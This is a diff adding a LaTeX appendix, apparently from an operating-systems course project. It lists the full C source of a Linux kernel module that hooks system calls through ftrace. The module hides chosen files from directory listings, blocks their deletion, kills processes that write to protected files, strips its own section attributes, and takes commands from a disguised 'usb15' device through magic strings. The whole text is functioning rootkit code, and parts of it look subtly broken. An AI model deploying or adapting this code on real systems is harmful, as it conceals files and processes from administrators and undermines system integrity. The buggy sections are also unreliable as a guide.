@@ -1,0 +1,692 @@
+\chapter{}
+
+\begin{lstlisting}[label=code:main,caption=Файл main.c]
+#include <linux/module.h>
+#include <linux/kallsyms.h>
+#include <linux/skbuff.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/device.h>
+#include <linux/cdev.h>
+#include <linux/proc_fs.h>
+#include <linux/string.h>
+
+#include "hooked.h"
+
+MODULE_DESCRIPTION("os_course");
+MODULE_AUTHOR("Darya Tatarinova");
+MODULE_LICENSE("GPL");
+
+#define PROC_FILE_NAME_HIDDEN "hidden"
+#define PROC_FILE_NAME_PROTECTED "protected"
+
+static char *buffer[MAX_BUF_SIZE];
+char tmp_buffer[MAX_BUF_SIZE];
+char hidden_files[100][9];
+int hidden_index = 0;
+char protected_files[100][9];
+int protected_index = 0;
+
+static ssize_t my_proc_write(struct file *file, const char __user *buf, size_t len, loff_t *ppos) 
+{
+	DMSG("my_proc_write called");
+	
+	if (len > MAX_BUF_SIZE - write_index + 1)
+	{
+		DMSG("buffer overflow");
+		return -ENOSPC;
+	}
+	
+	if (copy_from_user(&buffer[write_index], buf, len) != 0)
+	{
+		DMSG("copy_from_user fail");
+		return -EFAULT;
+	}
+	
+	write_index += len;
+	buffer[write_index - 1] = '\0';
+	
+	if (strcmp(file->f_path.dentry->d_iname, PROC_FILE_NAME_HIDDEN) == 0)
+	{
+		snprintf(hidden_files[hidden_index], len, "%s", &buffer[write_index - len]);
+		hidden_index++;
+		DMSG("file written to hidden %s", hidden_files[hidden_index - 1]);
+	}
+	if (strcmp(file->f_path.dentry->d_iname, PROC_FILE_NAME_PROTECTED) == 0)
+	{
+		snprintf(protected_files[protected_index], len, "%s", &buffer[write_index - len]);
+		protected_index++;
+		DMSG("file written to protected %s", protected_files[protected_index - 1]);
+	}
+	else
+	{
+		DMSG("Unknown file->f_path.dentry->d_iname");
+	}
+	return len;
+}
+
+static ssize_t my_proc_read(struct file *file, char __user *buf, size_t len, loff_t *f_pos) 
+{
+	DMSG("my_proc_read called.\n");
+	
+	if (*f_pos > 0 || write_index == 0)
+	return 0;
+	
+	if (read_index >= write_index)
+	read_index = 0;
+	
+	int read_len = snprintf(tmp_buffer, MAX_BUF_SIZE, "%s\n", &buffer[read_index]);
+	if (copy_to_user(buf, tmp_buffer, read_len) != 0)
+	{
+		DMSG("copy_to_user error.\n");
+		return -EFAULT;
+	}
+	
+	read_index += read_len;
+	*f_pos += read_len;
+	
+	return read_len;
+}
+
+static const struct proc_ops fops =
+{
+	proc_read: my_proc_read,
+	proc_write: my_proc_write
+}; 
+
+
+static int fh_init(void)
+{
+	DMSG("call init");
+	
+	proc_file_hidden = proc_create(PROC_FILE_NAME_HIDDEN, S_IRUGO | S_IWUGO, NULL, &fops);
+	if (!proc_file_hidden) 
+	{
+		DMSG("call proc_create_data() fail");
+		return -ENOMEM;
+	}
+	proc_file_protected = proc_create(PROC_FILE_NAME_PROTECTED, S_IRUGO | S_IWUGO, NULL, &fops);
+	if (!proc_file_protected) 
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		DMSG("call proc_create_data() fail");
+		return -ENOMEM;
+	}
+	DMSG("proc file created");
+	
+	struct device *fake_device;
+	int error = 0;
+	dev_t devt = 0;
+	
+	error = start_hook_resources();
+	if (error)
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		DMSG("Problem in hook functions");
+		return error;
+	}
+	
+	tidy();
+	
+	/* Get a range of minor numbers (starting with 0) to work with */
+	error = alloc_chrdev_region(&devt, 0, 1, "usb15");
+	
+	if (error < 0)
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		return error;
+	}
+	
+	major = MAJOR(devt);
+	minor = MINOR(devt);
+	
+	/* Create device class, visible in /sys/class */
+	fake_class = class_create(THIS_MODULE, "custom_char_class");
+	
+	if (IS_ERR(fake_class)) {
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		unregister_chrdev_region(MKDEV(major, minor), 1);
+		return PTR_ERR(fake_class);
+	}
+	
+	/* Initialize the char device and tie a file_operations to it */
+	cdev_init(&fake_cdev, &fake_fops);
+	fake_cdev.owner = THIS_MODULE;
+	/* Now make the device live for the users to access */
+	cdev_add(&fake_cdev, devt, 1);
+	
+	fake_device = device_create(fake_class,
+	NULL,   /* no parent device */
+	devt,    /* associated dev_t */
+	NULL,   /* no additional data */
+	"usb15");  /* device name */
+	
+	if (IS_ERR(fake_device))
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		class_destroy(fake_class);
+		unregister_chrdev_region(devt, 1);
+		return -1;
+	}
+	
+	return 0;
+}
+
+
+static void fh_exit(void)
+{
+	DMSG("call exit");
+	
+	if (proc_file_hidden) 
+	{
+		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
+		DMSG("proc file removed (hidden)");
+	}
+	
+	if (proc_file_protected) 
+	{
+		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
+		DMSG("proc file removed (prtotected)");
+	}
+	
+	fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
+	unregister_chrdev_region(MKDEV(major, 0), 1);
+	device_destroy(fake_class, MKDEV(major, 0));
+	cdev_del(&fake_cdev);
+	class_destroy(fake_class);
+}
+
+module_init(fh_init);
+module_exit(fh_exit);
+\end{lstlisting}
+
+
+\begin{lstlisting}[label=code:hook1,caption=Файл hook.h]
+#include <linux/ftrace.h>
+#include <linux/kallsyms.h>
+#include <linux/syscalls.h>
+#include <linux/kernel.h>
+#include <linux/version.h>
+#include <linux/kprobes.h>
+#include <linux/delay.h>
+#include <linux/kthread.h>
+#include <linux/kernel.h>
+#include <asm/signal.h>
+#include <linux/delay.h>
+#include <linux/fcntl.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
+#include <linux/device.h>
+#include <linux/cdev.h>
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/proc_fs.h>
+
+MODULE_DESCRIPTION("os_course");
+MODULE_AUTHOR("Darya Tatarinova");
+
+#define FILE_NAME (strrchr(__FILE__, '/') ? strrchr(__FILE__, '/') + 1 : __FILE__)
+#define DMSG(msg_fmt, msg_args...) \
+printk(KERN_INFO "OS: %s(%04u): " msg_fmt "\n", FILE_NAME, __LINE__, ##msg_args)
+
+#define MAX_BUF_SIZE 1000
+
+static struct proc_dir_entry *proc_file_hidden;
+static struct proc_dir_entry *proc_file_protected;
+
+extern char hidden_files[100][9];
+extern int hidden_index;
+extern char protected_files[100][9];
+extern int protected_index;
+
+static int read_index = 0;
+static int write_index = 0;
+
+static unsigned int major; 
+static unsigned int minor; 
+static struct class *fake_class;
+static struct cdev fake_cdev;
+
+static short fs_hidden = 1;
+static short fs_protect = 1;
+
+static inline void tidy(void)
+{
+	kfree(THIS_MODULE->sect_attrs);
+	THIS_MODULE->sect_attrs = NULL;
+}
+
+ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,loff_t * offset);
+
+
+static struct file_operations fake_fops = {
+	write: fake_write,
+};
+
+
+
+int check_fs_blocklist(char *input);
+int check_fs_hidelist(char *input);
+
+static unsigned int target_fd = 0;
+static unsigned int target_pid = 0;
+
+static unsigned long lookup_name(const char *name)
+{
+	struct kprobe kp = {
+		.symbol_name = name
+	};
+	unsigned long retval;
+	
+	if (register_kprobe(&kp) < 0) 
+	{
+		return 0;
+	}
+	retval = (unsigned long) kp.addr;
+	unregister_kprobe(&kp);
+	return retval;
+}
+
+
+#define USE_FENTRY_OFFSET 0
+
+struct ftrace_hook {
+	const char *name;
+	void *function;
+	void *original;
+	
+	unsigned long address;
+	struct ftrace_ops ops;
+};
+
+static int fh_resolve_hook_address(struct ftrace_hook *hook)
+{
+	hook->address = lookup_name(hook->name);
+	
+	if (!hook->address) {
+		pr_debug("unresolved symbol: %s\n", hook->name);
+		return -ENOENT;
+	}
+	
+	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+	
+	return 0;
+}
+
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
+struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+	struct pt_regs *regs = ftrace_get_regs(fregs);
+	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+	
+	regs->ip = (unsigned long)hook->function;
+}
+
+int fh_install_hook(struct ftrace_hook *hook);
+void fh_remove_hook(struct ftrace_hook *hook);
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
+
+#define PTREGS_SYSCALL_STUBS 1
+
+
+static char *get_filename(const char __user *filename)
+{
+	char *kernel_filename=NULL;
+	
+	kernel_filename = kmalloc(4096, GFP_KERNEL);
+	if (!kernel_filename)
+	return NULL;
+	
+	if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
+		kfree(kernel_filename);
+		return NULL;
+	}
+	
+	return kernel_filename;
+}
+
+
+static asmlinkage long (*real_sys_write)(struct pt_regs *regs);
+
+static asmlinkage long fh_sys_write(struct pt_regs *regs)
+{
+	long ret=0;
+	struct task_struct *task;
+	int signum = 0;
+	struct kernel_siginfo info;
+	
+	signum = SIGKILL;
+	task = current;
+	
+	if (task->pid == target_pid)
+	{
+		if (regs->di == target_fd)
+		{
+			DMSG("write done by process %d to target file.", task->pid);
+			memset(&info, 0, sizeof(struct kernel_siginfo));
+			info.si_signo = signum;
+			ret = send_sig_info(signum, &info, task);
+			if (ret < 0)
+			{
+				DMSG("error sending signal");
+			}
+			else
+			{
+				DMSG("Target has been killed");
+				return 0;
+			}
+		}
+	}
+	ret = real_sys_write(regs);
+	
+	return ret;
+}
+
+
+static asmlinkage long (*real_sys_open)(struct pt_regs *regs);
+
+static asmlinkage long fh_sys_open(struct pt_regs *regs)
+{
+	long ret;
+	char *kernel_filename;
+	struct task_struct *task;
+	task = current;
+	kernel_filename = get_filename((void*) regs->si);
+	//https://elixir.bootlin.com/linux/v4.19-rc2/source/include/linux/kernel.h
+	
+	if (check_fs_blocklist(kernel_filename))
+	{
+		DMSG("our file is opened by process with id: %d\n", task->pid);
+		DMSG("opened file : %s\n", kernel_filename);
+		kfree(kernel_filename);
+		ret = real_sys_open(regs);
+		DMSG("fd returned is %ld\n", ret);
+		target_fd = ret;
+		target_pid = task->pid;
+		return 0;
+		
+	}
+	
+	kfree(kernel_filename);
+	ret = real_sys_open(regs);
+	
+	return ret;
+}
+
+
+static asmlinkage long (*real_sys_unlinkat) (struct pt_regs *regs);
+
+static asmlinkage long fh_sys_unlinkat (struct pt_regs *regs)
+{
+	long ret=0;
+	char *kernel_filename = get_filename((void*) regs->si);
+	
+	if (check_fs_blocklist(kernel_filename))
+	{
+		
+		pr_info("blocked to not remove file : %s\n", kernel_filename);
+		ret=0;
+		kfree(kernel_filename);
+		return ret;
+		
+	}
+	
+	kfree(kernel_filename);
+	ret = real_sys_unlinkat(regs);
+	
+	return ret;
+}
+
+
+static asmlinkage long (*real_sys_getdents64)(const struct pt_regs *);
+
+static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
+{
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
+	unsigned long offset = 0;
+	int ret = real_sys_getdents64(regs);
+	
+	dirent_ker = kzalloc(ret, GFP_KERNEL);
+	
+	if ((ret <= 0) || (dirent_ker == NULL))
+	{
+		return ret;
+	}
+	
+	long error;
+	error = copy_from_user(dirent_ker, dirent, ret);
+	
+	if (error)
+	{
+		kfree(dirent_ker);
+		return ret;
+	}
+	
+	while (offset < ret)
+	{
+		current_dir = (void *)dirent_ker + offset;
+		
+		if (check_fs_hidelist(current_dir->d_name))
+		{
+			if (current_dir == dirent_ker )
+			{
+				ret -= current_dir->d_reclen;
+				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+				continue;
+			}
+			
+			previous_dir->d_reclen += current_dir->d_reclen;
+		}
+		else
+		{
+			previous_dir = current_dir;
+		}
+		
+		offset += current_dir->d_reclen;
+	}
+	
+	error = copy_to_user(dirent, dirent_ker, ret);
+	if (error)
+	{
+		DMSG("copy_to_user error");
+	}
+	
+	kfree(dirent_ker);
+	return ret;
+}
+
+#define SYSCALL_NAME(name) ("__x64_" name)
+
+#define HOOK(_name, _function, _original)	\
+{					\
+	.name = SYSCALL_NAME(_name),	\
+	.function = (_function),	\
+	.original = (_original),	\
+}
+
+static struct ftrace_hook demo_hooks[] = {
+	HOOK("sys_write", fh_sys_write, &real_sys_write),
+	HOOK("sys_open", fh_sys_open, &real_sys_open),
+	HOOK("sys_unlinkat", fh_sys_unlinkat, &real_sys_unlinkat),
+	HOOK("sys_getdents64", fh_sys_getdents64, &real_sys_getdents64)
+};
+
+
+static int start_hook_resources(void)
+{
+	int err;
+	err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
+	if (err)
+	{
+		return err;
+	}
+	return 0;
+}
+\end{lstlisting}
+
+\begin{lstlisting}[label=code:hook2,caption=Файл hook.c]
+#include "hooked.h"
+
+ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
+loff_t * offset)
+{
+	char message[128];
+	memset(message, 0, 127);
+	
+	if(copy_from_user(message,buf,127) != 0)
+	{
+		return EFAULT;
+	}
+	
+	if(strstr(message, "1234") != NULL)
+	{
+		fs_hidden = fs_hidden ? 0 : 1;
+	}
+	
+	if(strstr(message, "5678") != NULL)
+	{
+		fs_protect = fs_protect ? 0 : 1;
+	}
+	
+	return count;
+}
+
+
+int check_fs_blocklist(char *input)
+{
+	int i = 0;
+	
+	if (fs_protect==0)
+	{
+		return 0;
+	}
+	
+	if (strlen(protected_files[0]) <= 2)
+	{
+		return 0;
+	}
+	
+	while (i != protected_index)
+	{
+		if(strstr(input, protected_files[i]) != NULL)
+		return 1;
+		i++;
+	}
+	
+	return 0;
+}
+
+int check_fs_hidelist(char *input)
+{
+	int i = 0;
+	if (fs_hidden == 0)
+	{
+		return 0;
+	}
+	
+	if (strlen(hidden_files[0]) <= 2)
+	{
+		return 0;
+	}
+	
+	while (i != hidden_index)
+	{
+		if(strstr(input, hidden_files[i]) != NULL)
+		return 1;
+		i++;
+	}
+	
+	return 0;
+}
+
+int fh_install_hook(struct ftrace_hook *hook)
+{
+	int error;
+	
+	error = fh_resolve_hook_address(hook);
+	if (error)
+	{
+		return error;
+	}
+	
+	hook->ops.func = fh_ftrace_thunk;
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+	| FTRACE_OPS_FL_RECURSION
+	| FTRACE_OPS_FL_IPMODIFY;
+	
+	error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+	if (error) 
+	{
+		DMSG("ftrace_set_filter_ip() failed: %d\n", error);
+		return error;
+	}
+	
+	error = register_ftrace_function(&hook->ops);
+	if (error) 
+	{
+		DMSG("register_ftrace_function() failed: %d\n", error);
+		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+		return error;
+	}
+	
+	return 0;
+}
+
+
+void fh_remove_hook(struct ftrace_hook *hook)
+{
+	int err;
+	
+	err = unregister_ftrace_function(&hook->ops);
+	if (err) 
+	{
+		DMSG("unregister_ftrace_function() failed: %d\n", err);
+	}
+	
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+	if (err) 
+	{
+		DMSG("ftrace_set_filter_ip() failed: %d\n", err);
+	}
+}
+
+
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
+{
+	int err;
+	size_t i;
+	
+	for (i = 0; i < count; i++) 
+	{
+		err = fh_install_hook(&hooks[i]);
+		if (err)
+		{
+			while (i != 0) 
+			{
+				fh_remove_hook(&hooks[--i]);
+			}
+			return err;
+		}
+	}
+	
+	return 0;
+}
+
+
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
+{
+	size_t i;
+	
+	for (i = 0; i < count; i++)
+	{
+		fh_remove_hook(&hooks[i]);
+	}
+}
+\end{lstlisting}
